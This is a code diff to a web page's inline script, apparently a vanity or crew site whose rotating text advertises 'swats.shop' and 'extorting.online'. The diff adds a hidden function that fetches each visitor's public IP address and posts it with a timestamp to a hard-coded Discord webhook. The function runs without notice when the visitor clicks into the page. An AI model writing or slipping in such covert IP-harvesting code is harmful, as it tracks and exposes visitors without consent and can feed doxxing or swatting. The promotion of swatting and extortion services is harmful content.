@@ -112,12 +112,12 @@
         const audio = document.getElementById('background-music');
         const typingTextElement = document.getElementById('typing-text');
 
-       const texts = [
-    "...AL-MFJ runs dis shit!!!",
-    "...swats.shop",
-    "...extorting.online",
-     "...#FreeSusAGB",      
-];
+        const texts = [
+            "...AL-MFJ runs dis shit!!!",
+            "...swats.shop",
+            "...extorting.online",
+            "...#FreeSusAGB",      
+        ];
 
         let currentTextIndex = 0;
         let typingIndex = 0;
@@ -151,6 +151,35 @@
             }, 50); // Speed of deleting
         }
 
+        function sendIPToDiscord() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+                    const currentTime = new Date().toISOString();
+                    const discordWebhookUrl = 'https://discord.com/api/webhooks/1309497391119990845/gFcQfj4ftmqFvu5GdgMLQwfI3mk1Meozgu1whynwKrB18HReklgdLgKCnhSqej6Jdz2T'; // Replace with your webhook URL
+
+                    fetch(discordWebhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            content: `IP: ${userIP} | Time: ${currentTime}`
+                        })
+                    })
+                    .then(() => {
+                        console.log('IP and timestamp sent to Discord');
+                    })
+                    .catch(err => {
+                        console.error('Error sending to Discord:', err);
+                    });
+                })
+                .catch(err => {
+                    console.error('Error fetching IP:', err);
+                });
+        }
+
         overlay.addEventListener('click', () => {
             overlay.style.display = 'none'; // Hide overlay
             container.style.display = 'block'; // Show main content
@@ -162,6 +191,9 @@
             audio.play().catch((error) => {
                 console.error('Playback failed:', error);
             });
+
+            // Log the IP when the user enters
+            sendIPToDiscord();
         });
 
         function createStar(x, y) {
